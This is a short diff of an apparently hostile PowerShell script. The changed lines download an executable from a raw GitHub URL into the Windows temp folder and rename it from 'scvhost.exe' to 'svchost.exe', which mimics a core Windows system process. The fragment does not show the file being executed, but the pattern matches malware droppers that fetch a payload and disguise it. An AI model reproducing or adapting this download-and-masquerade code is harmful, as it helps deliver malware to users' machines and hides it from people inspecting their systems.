@@ -125,8 +125,8 @@ while ($true)
 
         Write-Console "DOWNLOADING..." "INFO"
 
-        $url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/scvhost.exe"
-        $path = "$env:TEMP\scvhost.exe"
+         $url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/svchost.exe"
+         $path = "$env:TEMP\svchost.exe"
 
         try {
 
